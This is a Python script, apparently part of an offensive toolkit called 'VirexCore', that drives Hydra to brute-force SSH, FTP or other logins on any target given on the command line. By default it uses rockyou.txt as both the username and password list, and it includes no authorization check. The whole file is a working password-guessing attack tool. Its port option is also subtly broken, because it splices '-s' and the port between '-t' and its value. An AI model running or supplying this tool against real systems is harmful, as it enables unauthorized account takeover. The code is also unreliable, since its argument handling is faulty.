#!/usr/bin/env python3
import os
import sys
import subprocess

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BOLD = "\033[1m"
RESET = "\033[0m"

def create_target_directory(target):
    """Create the target directory in /tmp/VirexCore/"""
    target_dir = f"/tmp/VirexCore/{target}"
    os.makedirs(target_dir, exist_ok=True)
    
    # Create hydra subdirectory
    hydra_dir = os.path.join(target_dir, "hydra")
    os.makedirs(hydra_dir, exist_ok=True)
    
    return target_dir, hydra_dir

def run_hydra(target, hydra_dir, protocol, port, username_list, password_list):
    """Run brute-force attack with Hydra"""
    output_file = os.path.join(hydra_dir, "hydra_results.txt")
    
    print(f"{YELLOW}[~] Running brute-force attack on {protocol}://{target}:{port}...{RESET}")
    
    try:
        cmd = ["hydra", "-L", username_list, "-P", password_list, f"{protocol}://{target}", "-t", "4", "-o", output_file]
        if port:
            cmd.insert(-3, "-s")
            cmd.insert(-3, port)
        
        subprocess.run(cmd, check=True)
        print(f"{GREEN}[✓] Brute-force attack completed. Results saved to {output_file}{RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Error running brute-force attack{RESET}")
        return False
    except FileNotFoundError:
        print(f"{RED}[!] Hydra not found. Please install Hydra.{RESET}")
        return False

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print(f"{RED}Usage: {sys.argv[0]} <target_ip_or_domain>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    target_dir, hydra_dir = create_target_directory(target)
    
    print(f"{GREEN}[+] Target: {target}{RESET}")
    print(f"{GREEN}[+] Output directory: {hydra_dir}{RESET}")
    
    # Get user input
    protocol = input(f"{CYAN}→ Enter Protocol (ssh, ftp, etc.) [default: ssh]: {RESET}") or "ssh"
    port = input(f"{CYAN}→ Enter Port (optional, press Enter to skip): {RESET}")
    username_list = input(f"{CYAN}→ Enter Username List Path [default: /usr/share/wordlists/rockyou.txt]: {RESET}") or "/usr/share/wordlists/rockyou.txt"
    password_list = input(f"{CYAN}→ Enter Password List Path [default: /usr/share/wordlists/rockyou.txt]: {RESET}") or "/usr/share/wordlists/rockyou.txt"
    
    # Check if wordlists exist
    if not os.path.exists(username_list):
        print(f"{RED}[!] Username list not found: {username_list}{RESET}")
        sys.exit(1)
    
    if not os.path.exists(password_list):
        print(f"{RED}[!] Password list not found: {password_list}{RESET}")
        sys.exit(1)
    
    # Run brute-force attack
    run_hydra(target, hydra_dir, protocol, port, username_list, password_list)

if __name__ == "__main__":
    main()